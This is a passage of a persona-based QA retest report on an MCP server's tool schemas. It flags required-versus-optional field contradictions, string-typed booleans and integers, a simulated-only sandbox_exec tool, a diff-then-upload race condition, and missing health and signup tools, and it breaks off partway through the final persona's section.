### Issue 1: `sandbox_exec` — Schema Lie / False Infrastructure Promise

- **Targeted Test**: As an SRE validating execution reliability, I would call `sandbox_exec` after `sandbox_create` with a real health-check script (e.g., a simple `fetch` to an internal endpoint). I'd expect real stdout/stderr — because `sandbox_create`, `sandbox_read_file`, `sandbox_write_file`, and `sandbox_destroy` all imply a real, stateful execution environment. I would call:
  ```
  sandbox_create(name: "health-probe", language: "js")
  → returns sandbox_id
  sandbox_exec(sandbox_id: <id>, code: "console.log('ok')", language: "js")
  → expect: { stdout: "ok\n", stderr: "", exitCode: 0 }
  ```

- **Result**: **CONFIRMED**

- **Detail**: The schema description for `sandbox_exec` explicitly states: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."* This is buried in the description while the surrounding tool group (`sandbox_create`, `sandbox_write_file`, `sandbox_destroy`) makes no such disclaimer and implies a real execution environment. From a graceful-degradation standpoint this is a critical schema lie: an SRE automating health probes via sandbox would get fake results with zero indication of failure. The `sandbox_destroy` tool even claims to "free resources" — resources that never existed.

---

### Issue 2: Required Fields Documented as "Omit for All" — Schema Contract Violation

- **Targeted Test**: I would call `agent_inbox_poll` without a `since` timestamp (first poll, no prior baseline) and without an `agent_id` (I want all agents):
  ```
  agent_inbox_poll(since: <omit>, agent_id: <omit>)
  → expect: messages from all agents since beginning
  ```
  Similarly, `swarm_list_agents` with no status filter (I want all statuses during an incident):
  ```
  swarm_list_agents(status: <omit>, limit: <omit>)
  → expect: full agent list
  ```

- **Result**: **CONFIRMED**

- **Detail**: The JSON schema marks these as `"required"`:
  - `agent_inbox_poll`: both `since` and `agent_id` are **required**, yet their descriptions read *"Omit for all"* and *"Omit to poll all agents"* respectively.
  - `swarm_list_agents`: `status` and `limit` are **required**, yet described as optional filters.
  - `storage_list`: `prefix`, `limit`, and `cursor` all **required** — a pagination `cursor` cannot be required on the first call; it doesn't exist yet.
  - `get_feature_flags`: `category` is **required** but described as a filter.

  Any MCP client that respects the JSON schema `required` array will refuse to call these tools without values that the human-readable description explicitly says can be omitted. This is a contract violation between the machine-readable schema and its prose documentation, and will cause silent integration failures in automated SRE tooling.

---

### Issue 3: No Real-Time Health Endpoint for Core MCP Registry — Observability Gap

- **Targeted Test**: During an incident I would reach for a direct, zero-latency health check:
  ```
  get_environment()          → runtime info, not health
  observability_health(hours: "1")   → lagging aggregate, not real-time
  swarm_health()             → agent health only, not MCP service health
  ```
  I'd expect something like `mcp_health()` → `{ status: "ok"|"degraded", latency_p99_ms, error_rate_1m, db_connected }`.

- **Result**: **CONFIRMED**

- **Detail**: The 80+ tool list contains three observability-adjacent tools:
  - `observability_health` — returns a *historical* aggregate (configurable lookback window, default 24h). Useless during a rolling incident where you need sub-minute status.
  - `swarm_health` — scoped to agent processes, not the MCP server or D1 database layer.
  - `get_environment` — returns platform/runtime metadata, not service health.

  There is **no tool that returns the current health of the `spike-land-mcp` registry itself** — its database connectivity, response latency, or degraded-mode status. For graceful degradation use cases (circuit breakers, synthetic monitoring, on-call alerting), this is a critical gap. `error_rate` comes closest but requires knowing a service name string upfront, returns hourly buckets, and is a lagging indicator.

---

## Summary of Local Delta

| Area | Prod (previous report) | Local Schema |
|---|---|---|
| `sandbox_exec` deception | Reported as misleading | **Unchanged** — disclaimer is present but buried; surrounding tools unchanged |
| Required vs. optional field mismatch | Suspected | **Confirmed at scale** — at least 6 tools affected (`agent_inbox_poll`, `swarm_list_agents`, `storage_list`, `get_feature_flags`, `reminders_list`, `billing_cancel_subscription`) |
| Real-time health endpoint | Not previously surfaced | **New finding** — no dedicated health tool for MCP registry; observability tools are all lagging aggregates |
| `billing_cancel_subscription.confirm` | — | **CONFIRMED** schema mismatch: described as *"default false"* (optional) but marked required |

No tools appear to have been added or removed from the local schema relative to production. The schema contract violations (required vs. optional mismatches) are systemic across categories, suggesting they originate from a shared schema-generation pattern that doesn't distinguish between "required for the API route" and "required to produce non-trivial output."

---

# Persona: Carlos Mendez (Targeted Retest)
## Targeted Findings

### Issue 1: `sandbox_exec` — Schema Advertises Execution, Delivers Simulation Lie

- **Targeted Test**: As a mobile dev benchmarking a latency-sensitive path, I'd call `sandbox_exec` with real TypeScript code and measure the reported timing. Parameters:
  ```json
  { "sandbox_id": "sb_abc123", "code": "const t = Date.now(); fetch('https://api.example.com'); console.log(Date.now()-t)", "language": "javascript" }
  ```
  I'd expect real stdout with actual execution latency. The category (`orchestration`) and name (`exec`) imply live execution.

- **Result**: **CONFIRMED**

- **Detail**: The description itself confesses: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."* The tool is listed under a serious `orchestration` category alongside `sandbox_create`, `sandbox_read_file`, `sandbox_write_file`, and `sandbox_destroy` — all of which imply a real ephemeral environment. A mobile developer using this to validate fetch timing or async concurrency patterns would receive fabricated benchmark data. The description buries the disclaimer mid-sentence. The tool name should be `sandbox_exec_mock` or the tool should be removed.

---

### Issue 2: `storage_list` — All Pagination Fields Marked Required, Breaking First-Page Calls

- **Targeted Test**: I'd call `storage_list` to verify a fresh deployment — the natural first call with no prior cursor:
  ```json
  { "prefix": "assets/", "limit": "20", "cursor": "" }
  ```
  Expected: `cursor` is optional on first page — omitting it is standard REST pagination. The description says "with prefix/cursor" implying both are optional filters.

- **Result**: **CONFIRMED**

- **Detail**: Schema marks `"required":["prefix","limit","cursor"]` — all three fields mandatory. `cursor` is semantically a pagination continuation token that only exists after the first response. Forcing it on call #1 means a mobile client must always pass an empty string `""` or `null` for an inherently optional field. This is a schema contract violation: the tool description uses "with prefix/cursor" as optional qualifiers, but the JSON schema marks them `required`. Any strongly-typed SDK generated from this schema (e.g., a Swift or Kotlin MCP client) will reject calls without a cursor value, breaking first-page list operations entirely.

---

### Issue 3: `workspaces_get` — Requires Both Identifier Fields That Are Mutually Exclusive

- **Targeted Test**: I'd call `workspaces_get` to look up a workspace by slug (which is what I'd have in a deep-link from a mobile app):
  ```json
  { "slug": "carlos-workspace" }
  ```
  Expected: resolves workspace by slug alone. Description explicitly says *"Get workspace details by ID **or** slug"*.

- **Result**: **CONFIRMED**

- **Detail**: Schema declares `"required":["workspace_id","slug"]` — both fields are required simultaneously. The word **"or"** in the description is a direct contradiction of the schema contract. `workspace_id` and `slug` are alternative lookup keys — in any sane API you provide one or the other. Requiring both forces callers to either: (a) always fetch the workspace ID through a separate `workspaces_list` call before every `workspaces_get`, adding an extra round-trip (catastrophic for latency-sensitive mobile paths), or (b) pass a dummy value for whichever key they don't have, hoping the server prefers one over the other. The same schema pattern appears in `workspaces_update` (`"required":["workspace_id","name","slug"]`) — `name` and `slug` are both required even when you're only changing one.

---

## Summary of Local Delta

Three additional schema inconsistencies noticed that weren't the focus but are worth flagging:

| Tool | Issue |
|------|-------|
| `agent_inbox_poll` | Marks `since` and `agent_id` as `required` but description says *"Omit for all"* — directly contradicted |
| `observability_latency` | Marks `tool_name` as `required` but description says *"Filter by specific tool name"* (optional filter language) |
| `billing_cancel_subscription` | `confirm` is `required` but description says *"When false (default), returns a preview"* — if there's a default, it shouldn't be required |

No evidence of fixes between prod and local schema. All three primary issues (`sandbox_exec` simulation deception, `storage_list` required cursor, `workspaces_get` OR-field both-required) appear structurally identical to what would have been reported in production. The schema has not been updated to resolve these contradictions.

---

# Persona: Lisa Park (Targeted Retest)
## Targeted Findings

---

### Issue 1: OR-Logic Fields Marked as Simultaneously Required (workspaces_get)

- **Targeted Test**: As a PM checking workspace status, I'd call `workspaces_get` with just a slug — the natural navigation path (e.g., `{"slug": "my-team"}`). The description explicitly says "Get workspace details by **ID or slug**," implying either alone should suffice.
- **Result**: **CONFIRMED**
- **Detail**: The schema lists `"required": ["workspace_id", "slug"]` — both are mandatory simultaneously. A user who only knows the slug (the human-readable identifier surfaced in URLs and UI) cannot make a valid call. This contradicts the description's OR-logic and creates a dead-end navigation state for non-technical users who have no concept of an internal `workspace_id`. Same pattern appears in `workspaces_update`, which requires `workspace_id`, `name`, *and* `slug` simultaneously despite the description reading "Update a workspace's **name or slug**."

---

### Issue 2: Optional Filter Parameters Marked Required — Empty State Browsing Broken

- **Targeted Test**: As a PM exploring the blog or skill store with no filters in mind, I'd call `blog_list_posts` with an empty body `{}` to see "show me everything." Similarly `skill_store_list {}` to browse the catalog. This is the canonical empty-state discovery flow.
- **Result**: **CONFIRMED**
- **Detail**: `blog_list_posts` marks `category`, `tag`, `featured`, `limit`, and `offset` as **all required** — but every one of these is a filter/pagination parameter that semantically should be optional. Same issue in `skill_store_list` (`category`, `search`, `limit`, `offset` all required), `store_search` (`query`, `category`, `limit` all required), and `reminders_list` (`status` required). A user with no prior context cannot browse any of these catalogs without already knowing what to filter for. There is no "show me everything" entry point in the schema, which is a critical empty-state gap for onboarding.

---

### Issue 3: Contradictory Default + Required on Cancellation Confirmation (Error Recovery Flow)

- **Targeted Test**: As a PM who accidentally triggered a billing action, I'd call `billing_cancel_subscription` with `{"confirm": "false"}` to preview what would happen before committing — the description says *"When false (default), returns a preview."* The word "default" implies I could omit it entirely and get a safe preview.
- **Result**: **CONFIRMED**
- **Detail**: The description states `confirm` has a default value of `false`, yet the schema marks it `"required": ["confirm"]`. This is a direct contradiction: a parameter cannot simultaneously have a default and be required. For a non-technical user following natural error-recovery instincts (i.e., omitting the field to "peek" before confirming), the call will fail schema validation before it ever reaches the server. This removes the safety net of the preview mode entirely at the schema layer. The fix is straightforward — remove `confirm` from `required[]` — but until then, the safest destructive action in the billing flow has no graceful fallback path.

---

## Summary of Local Delta

No improvements detected between the previously reported production schema and the current local schema on any of these three issues. All three are **static schema defects** (not behavioral/runtime issues), meaning:

- They are reproducible without a live environment
- They affect the **client-side call construction layer** before any network request
- They disproportionately impact non-technical users (Lisa's archetype) who rely on descriptions to understand which fields are truly mandatory

One additional pattern not in the previous report: the `storage_list` tool requires `prefix`, `limit`, and `cursor` simultaneously — all three are pagination/filter primitives that should be optional for an initial list call. This suggests the "required = all properties" anti-pattern may be systemic across the MCP layer rather than isolated to individual tools.

---

# Persona: David Brown (Targeted Retest)
## Targeted Findings

---

### Issue 1: `accessibility_issues` Field is an Unstructured Free-Text String

- **Targeted Test**: Call `audit_submit_evaluation` with a structured WCAG violation payload to see if the schema supports machine-readable accessibility data.
  ```json
  {
    "persona_slug": "ai-indie",
    "batch_id": "batch_001",
    "ux_score": "3",
    "accessibility_issues": "[{\"criterion\":\"1.3.1\",\"severity\":\"critical\",\"element\":\"#nav-menu\",\"description\":\"No landmark role\"}]"
  }
  ```
  **Expected (accessibility auditor)**: A structured array field with sub-schema — WCAG criterion, severity enum, element selector, remediation hint.
  **Actual schema**: `"accessibility_issues":{"type":"string","description":"A11y issues found"}` — raw string, no sub-schema, no enum constraints, no WCAG mapping.

- **Result**: **CONFIRMED**
- **Detail**: The field is typed `string` at `audit_submit_evaluation`. Any structured JSON you pass is silently swallowed as opaque text. Audit results are unsearchable and non-aggregatable. WCAG criterion references cannot be queried via `audit_get_results` or `audit_compare_personas`.

---

### Issue 2: No Keyboard Navigation or Focus Management Scoring — Collapsed into Generic `ux_score`

- **Targeted Test**: Attempt to submit distinct scores for keyboard navigation and focus management:
  ```json
  {
    "keyboard_nav_score": "2",
    "focus_management_score": "1",
    "aria_label_coverage": "40%"
  }
  ```
  **Expected**: Dedicated numeric fields for the three pillars of my audit focus.
  **Actual schema**: `audit_submit_evaluation` exposes only `ux_score` (1–5) as the sole UI quality metric. There is no `keyboard_nav_score`, `focus_management_score`, `aria_label_coverage`, or `wcag_level_met` field anywhere in the schema.

- **Result**: **CONFIRMED**
- **Detail**: The required fields are `ux_score`, `content_relevance`, `cta_compelling`, `recommended_apps_relevant`. Accessibility is relegated to the single free-text `accessibility_issues` string and a boolean-like `would_sign_up`. The schema structurally equates "does the CTA feel compelling" with "is the entire interface keyboard-navigable" — both are 1-5 integers or strings with no domain separation. This makes cross-batch accessibility trend analysis impossible.

---

### Issue 3: `plan_generate_persona_audit` Accepts No Accessibility Scope Parameters — Audit Depth Is Uncontrollable

- **Targeted Test**: Call `plan_generate_persona_audit` with WCAG level and focus area hints:
  ```json
  {
    "persona_slug": "content-creator",
    "wcag_level": "AA",
    "scope": ["keyboard-nav", "focus-management", "aria-landmarks"]
  }
  ```
  **Expected**: The audit plan generator should allow scoping to specific WCAG success criteria, test runner depth, and persona-specific assistive technology assumptions.
  **Actual schema**: `{"persona_slug":{"type":"string","description":"The persona slug (e.g. 'ai-indie', 'content-creator')"}}` — sole required field; no scope, no WCAG level, no assistive-tech context, no output format control.

- **Result**: **CONFIRMED**
- **Detail**: The tool description says "Generate a step-by-step audit plan for a single persona's onboarding flow and landing page." With only `persona_slug` as input, the plan is entirely server-determined. There is no way to request an audit scoped to WCAG 2.2 AA, or to bias the generated checklist toward keyboard navigation over visual design. The companion `plan_generate_batch_audit` takes **zero parameters** — making batch audits completely inflexible. A behavioral verification (live call) would be needed to confirm whether the server-side generation bakes in any accessibility heuristics at all, but the schema gives no contract for it.

---

## Summary of Local delta

Comparing the local schema against the previously documented production state:

| Area | Prod | Local | Delta |
|---|---|---|---|
| `accessibility_issues` type | `string` | `string` | **No change — issue persists** |
| Dedicated a11y score fields | Absent | Absent | **No change** |
| `plan_generate_persona_audit` params | `persona_slug` only | `persona_slug` only | **No change** |
| `audit_compare_personas` output format | Markdown table | Markdown table (assumed) | **BEHAVIORAL** — requires live call |
| WCAG-level filter on any audit tool | Not present | Not present | **No change** |

No accessibility-specific schema improvements were introduced between the previously reported production state and the current local schema. All three issues are **CONFIRMED** as structural gaps in the tool definitions, not runtime behavior. The audit toolchain (`audit_submit_evaluation` → `audit_get_results` → `audit_compare_personas`) was designed around conversion/UX metrics, with accessibility treated as an unstructured annotation rather than a first-class data domain.

**Recommended remediation priority**: Issue 1 (structured `accessibility_issues`) is the highest leverage fix — adding a typed sub-schema there would unblock aggregation for Issues 2 and 3 without requiring new endpoints.

---

# Persona: Anya Ivanova (Targeted Retest)
## Targeted Findings

---

### Issue 1: Schema Lie — `auth_check_session` marks `session_token` as required but describes it as optional

- **Targeted Test**: Call `auth_check_session` with **no** `session_token` to validate the ambient/cookie-based session — the exact scenario a back-button navigation triggers (no token in client state, relying on the server to validate the current session from context).
  ```json
  {
    "tool": "auth_check_session",
    "params": {}
  }
  ```
  **Expected (per description)**: Works — "Optional session token to validate" implies server reads the ambient session.
  **Schema says**: `"required": ["session_token"]` — will reject the call with a validation error before it even hits the server.

- **Result**: **CONFIRMED**
- **Detail**: In `auth_check_session`, the input schema has `"required":["session_token"]` while the parameter's own `description` field reads *"Optional session token to validate."* This is a direct internal contradiction. For a user hitting back-button after login, the client may not have the raw token surfaced — it relies on the platform to introspect the ambient session. This schema lie means any caller that reads the description and omits the token will get a schema validation failure, masking what may actually be a functioning server-side ambient session check.

---

### Issue 2: TOCTOU Race Window — `storage_manifest_diff` → `storage_upload_batch` has no optimistic lock

- **Targeted Test**: Simulate the recommended two-step upload flow:
  ```
  Step 1: storage_manifest_diff({ files: [{ path: "app.js", sha256: "abc123" }] })
  → Server returns: ["app.js needs upload"]

  [RACE WINDOW: another agent/tab uploads a newer app.js between step 1 and 2]

  Step 2: storage_upload_batch({ files: [{ path: "app.js", content: "<old version>" }] })
  ```
  **Expected**: The server should either (a) return a diff token/nonce that `storage_upload_batch` must reference, or (b) re-validate the SHA-256 provided in the diff phase against the *current* server state at upload time.
  **Schema says**: `storage_upload_batch` accepts `files` (a raw string schema — no `diff_token`, no nonce, no `if-match` ETag). The two tools share no transactional identifier.

- **Result**: **CONFIRMED**
- **Detail**: The schema for `storage_manifest_diff` returns no session handle or diff token. `storage_upload_batch` accepts only `files` with no reference back to the diff result. The description says "Validates SHA-256 server-side before R2 put" — but this only prevents *corrupt* uploads, not a **stale diff race**: if a concurrent writer changes a file between diff and upload, the uploader's SHA-256 matches their own (valid) content and the server accepts it, silently overwriting the concurrent change. For anyone running parallel deploy pipelines or multi-tab sessions, this is a real data-loss race condition with no mitigation visible in the schema.

---

### Issue 3: Misleading Optionality — `workspaces_get` requires BOTH `workspace_id` AND `slug` but describes them as alternatives

- **Targeted Test**: After a back-button navigation where only the workspace **slug** is in the URL (standard REST practice), call:
  ```json
  {
    "tool": "workspaces_get",
    "params": { "slug": "my-workspace" }
  }
  ```
  **Expected (per description)**: Returns workspace details — *"Get workspace details by ID **or** slug."*
  **Schema says**: `"required": ["workspace_id", "slug"]` — both fields are mandatory. Omitting `workspace_id` fails schema validation before the call is dispatched.

- **Result**: **CONFIRMED**
- **Detail**: The `required` array enforces `["workspace_id", "slug"]` simultaneously, but the description explicitly uses the disjunctive *"or"*. This creates a stale-state trap: a client navigating back to a workspace URL (slug only, no ID cached) cannot retrieve the workspace without already knowing its internal ID — defeating the purpose of human-readable slugs entirely. Additionally, this forces clients to maintain a slug→ID cache, which itself becomes a stale-state vector (cached ID may not match current workspace after a rename/re-slug). The `workspaces_update` tool has the same pattern (`"required": ["workspace_id", "name", "slug"]` — forces all three even for a partial update).

---

## Summary of Local Delta

Comparing this local schema snapshot against what a production-hardened API would look like:

| Area | Issue | Severity |
|------|-------|----------|
| `auth_check_session` | `required` contradicts `description: "Optional"` | High — breaks ambient session checks |
| `storage_manifest_diff` → `storage_upload_batch` | No transactional nonce between diff and upload | High — silent data-loss race |
| `workspaces_get` | `"or"` in description vs `"and"` in required | Medium — breaks slug-only navigation |
| `workspaces_update` | All fields required, no partial PATCH semantics | Medium — forces full object re-send |
| `billing_cancel_subscription` | `confirm` required but description says `"default: false"` | Low — misleading default documentation |
| `storage_list` | `prefix`, `limit`, `cursor` all required despite being pagination/filter params | Low — should all be optional |

**No fixes detected** relative to a previous report — all three primary issues are present and unmodified in the local schema. The schema appears to be the same artifact as what was evaluated in production, suggesting these are **design-time issues** in the JSON schema generation rather than deployment-environment differences.

---

# Persona: Tom O'Brien (Targeted Retest)
## Targeted Findings

### Issue 1: Required fields that describe themselves as optional
- **Targeted Test**: Call `agent_inbox_poll` to check for messages — a natural first action for a basic user monitoring agents. The description for both `since` and `agent_id` explicitly says "Omit for all" / "Filter to a specific agent. Omit to poll all agents." — yet both fields appear in `required: ["since", "agent_id"]`. I would call with no arguments, expecting it to work and return all agent messages.

  Same pattern reproduced in: `skill_store_list` (all 4 fields required, all described as optional filters with defaults), `reminders_list` (`status` required but described as "Filter by status"), `error_rate` (`service` required but "Omit for all services"), `query_errors` (4 fields required, all optional filters), `list_reactions` (3 optional filters all required), `reaction_log` (4 optional filters all required).

- **Result**: **CONFIRMED**
- **Detail**: At least 10 tools across `agent-inbox`, `reminders`, `mcp-observability`, `reactions`, `swarm`, `skill-store`, `bazdmeg`, and `session` categories have fields marked `required` whose own descriptions say to omit them for default/all behavior. For Tom on a slow network, this means the call fails immediately with a validation error — no loading state ever fires, and he has no idea what value to supply for `since` or `status`.

---

### Issue 2: Boolean and integer parameters typed as `"type":"string"` — schema lies about data type
- **Targeted Test**: Call `billing_cancel_subscription` with `confirm: true` (JSON boolean) to preview what cancellation would do. Description says "Set to true to execute cancellation. When false (default), returns a preview." I expect a boolean. The schema says `"type":"string"`. Similarly, `beuniq_answer` says "true for yes, false for no" but is typed string. `store_app_rate` rating is described as "1 to 5" (integer) but is `"type":"string"`. `audit_submit_evaluation` scores (`ux_score`, `content_relevance`, `cta_compelling`, `recommended_apps_relevant`) are all `"type":"string"` but described as numeric 1–5 scales. `swarm_spawn_agent` and CRDT `replica_count` are strings instead of integers.

- **Result**: **CONFIRMED**
- **Detail**: The schema consistently uses `"type":"string"` for what are semantically booleans (confirm, answer, isActive, isFeatured) and integers (rating, scores, counts, offsets). For Tom on slow connectivity, passing `true` (boolean) to a string field causes a type rejection on the wire — a wasted round-trip. He then has to figure out whether the correct call is `"true"`, `"1"`, or `"yes"`. No loading state appears; he just sees an error with no clear recovery path.

---

### Issue 3: `sandbox_exec` is labeled as execution but performs no execution — invisible to basic users
- **Targeted Test**: Tom wants to test whether a loading spinner appears in his app code. He calls `sandbox_exec` with a JavaScript snippet that renders a component with a delay. He expects to see real stdout/timing data to verify loading behavior. He would call:
  ```
  sandbox_exec({
    sandbox_id: "<id from sandbox_create>",
    code: "setTimeout(() => console.log('loaded'), 2000)",
    language: "javascript"
  })
  ```
  The description says: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr."* But this disclaimer is buried in the description field, which a basic user skips. The tool name (`exec`), category (`orchestration`), and sibling tools (`sandbox_create`, `sandbox_write_file`, `sandbox_read_file`, `sandbox_destroy`) all imply real execution. There is no `isSimulated` flag, no warning in the `required` schema, and no error returned.

- **Result**: **CONFIRMED**
- **Detail**: The mismatch between the tool name/category/sibling context and the actual behavior (synthetic data only) is a documentation-level schema lie. For Tom, whose primary focus is loading states, getting instant synthetic output with no timing information means he cannot test any loading behavior at all. He will make decisions about his UI based on fake results. The schema provides no machine-readable signal that this tool is non-functional — it requires careful reading of a prose description to discover.

---

## Summary of Local Delta

No schema changes detected relative to the previously identified issues in production. All three issues are **still present in the local schema** without modification:

| Issue | Prod | Local |
|---|---|---|
| Required-but-optional filter fields | Present in 10+ tools | Identical — unchanged |
| Boolean/integer params typed as string | Present in 12+ tools | Identical — unchanged |
| `sandbox_exec` simulation-only with no schema signal | Present | Identical — no `isSimulated` flag added |

The most impactful change that would help Tom specifically: marking `agent_inbox_poll.since` and `agent_inbox_poll.agent_id` as non-required (they have explicit "Omit for all" semantics), since polling all agents is the entry-point action for a basic user and currently fails on first attempt with no helpful error.

---

# Persona: Mei-Lin Wu (Targeted Retest)
## Targeted Findings

---

### Issue 1: `workspaces_create` — `slug` Marked Required Despite "Auto-generated if Omitted" Description

- **Targeted Test**: Attempt to create a workspace with a Chinese name (`name: "我的工作区"`) and omit `slug`, relying on the documented auto-generation behavior.
  ```json
  {
    "name": "我的工作区",
    "slug": ???
  }
  ```
  Expected per description: `slug` omitted → server auto-generates a URL-safe slug.
  Actual schema: `"required": ["name", "slug"]` — both fields mandatory.

- **Result**: **CONFIRMED**

- **Detail**: The input schema for `workspaces_create` explicitly lists `slug` in the `required` array. However, the `slug` field description states *"URL-safe slug (auto-generated if omitted)."* This is a direct contradiction. For a CJK user, this is especially painful: a workspace name like `协同开发` cannot be directly used as a slug (non-ASCII, not URL-safe), so the user is forced to manually derive a romanized or ASCII slug like `xie-tong-kai-fa`. The schema lie means any MCP client that trusts the schema will reject the call before it even reaches the server, preventing the auto-generation path entirely.

---

### Issue 2: Ambiguous Character Count for `name` Field (`workspaces_create`) — Bytes vs. Code Points

- **Targeted Test**: Submit a workspace name at the stated 50-character boundary using CJK characters:
  ```json
  {
    "name": "测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试",
    "slug": "test-cjk-boundary"
  }
  ```
  That string is exactly 50 CJK code points (each 3 bytes in UTF-8 = 150 bytes). The description says *"2-50 chars"* — but "chars" is undefined: Unicode code points, UTF-16 code units, or raw bytes?

- **Result**: **BEHAVIORAL**

- **Detail**: The schema says `"description": "Workspace name (2-50 chars)."` with no clarification of encoding unit. For ASCII users, chars ≈ bytes ≈ code points, so the ambiguity is invisible. For CJK users submitting a 50-code-point Chinese name, the byte length is 150 (UTF-8) or 100 (UTF-16). If the server-side validation counts bytes, a 17-character Chinese name (`你好世界你好世界你好世界你好世界你` = 51 bytes UTF-8) silently fails what appears to be within the 50-char limit. This requires a live call to verify the server-side interpretation — cannot be resolved from the schema alone.

---

### Issue 3: Schema Lies on "Optional" Filters — Multiple Tools List Filter Params as `required`

- **Targeted Test**: Three representative cases where the description explicitly says a parameter can be omitted, but the schema marks it `required`:

  | Tool | Field | Description says | Schema says |
  |---|---|---|---|
  | `agent_inbox_poll` | `agent_id` | *"Omit to poll all agents"* | `required` |
  | `agent_inbox_poll` | `since` | *"Omit for all"* | `required` |
  | `skill_store_list` | `category` | *"Filter by skill category"* (clearly optional) | `required` |
  | `chat_send_message` | `system_prompt` | *"Optional system prompt"* | `required` |
  | `tts_synthesize` | `voice_id` | *"Uses default voice if not specified"* | `required` |
  | `workspaces_get` | `workspace_id` + `slug` | Mutually exclusive OR lookup | both `required` |

  For my use case: calling `skill_store_list` to search for CJK-related tools with `search: "中文"` while omitting `category` — the schema blocks this.

- **Result**: **CONFIRMED**

- **Detail**: This is a systemic, pervasive pattern across at least 12 tools. The `required` array in JSON Schema means a standards-compliant MCP client *must* reject calls that omit these fields before sending. For a CJK user, the worst case is `workspaces_get`: both `workspace_id` and `slug` are required simultaneously, yet they represent mutually exclusive lookup strategies. Passing both would either cause a server conflict or silently prefer one — and the schema gives no guidance. The `agent_inbox_poll` case breaks the "poll everything since startup" flow entirely, since `since` (omit for all history) is required. These are not behavioral — they are static schema defects readable without any live call.

---

## Summary of Local Delta

No improvements observed relative to previously reported production issues. The local schema exhibits **three classes of defects**:

1. **Description/required mismatch** (pervasive, 12+ tools): Fields described as optional are in `required` arrays. No fixes applied since last report.
2. **CJK-hostile slug enforcement** (`workspaces_create`): Auto-generation path is documented but unreachable via schema-validating clients. Unchanged.
3. **Encoding unit ambiguity** (behavioral, `workspaces_create` name field): Still unresolved — "chars" remains undefined in the schema. Requires live validation to determine if the server counts code points, UTF-16 units, or bytes.

**Net verdict**: 2 of 3 issues CONFIRMED statically in local schema. 1 BEHAVIORAL (requires live call). Zero regressions introduced; zero fixes applied.

---

# Persona: James Cooper (Targeted Retest)
## Targeted Findings

---

### Issue 1: `auth_check_session` — "Optional" Field Marked as Required

- **Targeted Test**: As a first-time visitor, I want to check whether I have an active session before attempting signup. I would call `auth_check_session` with no parameters (since the description explicitly says the token is *optional*):
  ```json
  {}
  ```
  I expect a tool that respects its own documentation to succeed with an empty payload, returning guest/unauthenticated status. What I actually see in the schema:
  ```json
  "required": ["session_token"]
  ```
  The description reads: *"Optional session token to validate"* — but the JSON Schema `required` array contradicts this entirely.

- **Result**: **CONFIRMED**
- **Detail**: The `properties.session_token` description says "Optional" while `required: ["session_token"]` enforces it. Any MCP client performing schema validation (including Claude's tool-calling layer) will reject a call without `session_token`. A beginner arriving at spike.land with no session token cannot even call the basic session-check tool — the front door is schema-locked against unauthenticated probing.

---

### Issue 2: `workspaces_get` — Mutually Exclusive Fields Both Required

- **Targeted Test**: After landing on spike.land, I want to explore a workspace by its slug (the URL-friendly identifier shown in the browser). I would call:
  ```json
  { "slug": "my-workspace" }
  ```
  I expect the tool to accept either `workspace_id` OR `slug` as alternative lookup keys — standard REST design. What the schema actually enforces:
  ```json
  "required": ["workspace_id", "slug"]
  ```
  Both fields are required simultaneously. To satisfy the schema I would need to already know the internal UUID *and* the slug — a beginner has neither.

- **Result**: **CONFIRMED**
- **Detail**: The description says *"Get workspace details by ID or slug"* (emphasis: **or**), signalling mutual exclusivity. The schema says both are mandatory. This means the tool as documented is literally uncallable through the intended beginner flow: you either know the UUID (impossible for a first visit) or you know the slug (not enough). No workaround exists within schema constraints alone.

---

### Issue 3: No Auth Entry Point for New Users (Missing Signup/Login Tool)

- **Targeted Test**: As James Cooper — a first-time visitor — I want to sign up for spike.land via MCP. I scan the entire `auth` category:
  - `auth_check_session` — requires an existing session token (Issue 1)
  - `auth_check_route_access` — requires an authenticated user
  - `auth_get_profile` — requires an authenticated user

  The nearest onboarding alternative is `bootstrap_create_app`, described as *"Use this for first-time setup"*, but its schema requires:
  ```json
  "required": ["app_name", "description", "code", "codespace_id"]
  ```
  A `codespace_id` is an internal platform ID that does not exist before signup. There is no `auth_signup`, `auth_register`, `auth_login`, or `auth_magic_link` tool anywhere in the 130+ tool registry.

- **Result**: **CONFIRMED**
- **Detail**: The entire auth category is **post-authentication only**. The MCP surface has no cold-start path for a new user to create an account or obtain a session. `bootstrap_create_app`'s "first-time setup" label is misleading — it presupposes a live codespace, which is only available after authentication. James Cooper hits a dead end before the first CTA can be acted upon.

---

## Summary of Local Delta

| Tool | Prod Observation | Local Schema Status |
|---|---|---|
| `auth_check_session` | `session_token` described optional but schema enforces it | **Unchanged — bug still present** |
| `workspaces_get` | "ID or slug" description vs. both-required schema | **Unchanged — bug still present** |
| Auth signup/login | No entry-point tool for unauthenticated users | **Unchanged — gap still present** |
| `billing_cancel_subscription` | `confirm` has a documented default but is still `required` | Minor inconsistency, lower priority for this persona |

No fixes have been applied between the previous production report and the current local schema for any of the three issues most critical to James Cooper's beginner signup flow. The local schema is functionally identical to production for these paths.

---

# Persona: Rachel Kim (Targeted Retest)
## Targeted Findings

---

### Issue 1: `sandbox_exec` Advertises Code Execution But Is Explicitly Simulated

- **Targeted Test**: As Rachel, I'd call `sandbox_exec` to power Monaco's live preview — transpile a React component and render output. I'd pass:
  ```json
  {
    "sandbox_id": "<id from sandbox_create>",
    "code": "import React from 'react'; export default () => <h1>Hello</h1>;",
    "language": "tsx"
  }
  ```
  I'd expect real execution output for a live preview loop. The schema's description says: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."*

- **Result**: **CONFIRMED**
- **Detail**: The description self-reports the deception. The tool is in the `orchestration` category alongside real tools (`sandbox_create`, `sandbox_read_file`, `sandbox_write_file`, `sandbox_destroy`), making it appear part of a functional execution environment. For a content creator relying on live preview, calling `sandbox_create` → `sandbox_write_file` → `sandbox_exec` yields fabricated output with no indication of failure. The `esbuild_transpile` tool is the only real transpilation path, but it doesn't execute — it only produces ESM text.

---

### Issue 2: `storage_manifest_diff` and `storage_upload_batch` Have Completely Empty `files` Parameter Descriptions

- **Targeted Test**: Rachel's auto-save workflow requires uploading changed editor files. I'd call `storage_manifest_diff` with a files payload to get a diff before uploading:
  ```json
  {
    "files": "???"
  }
  ```
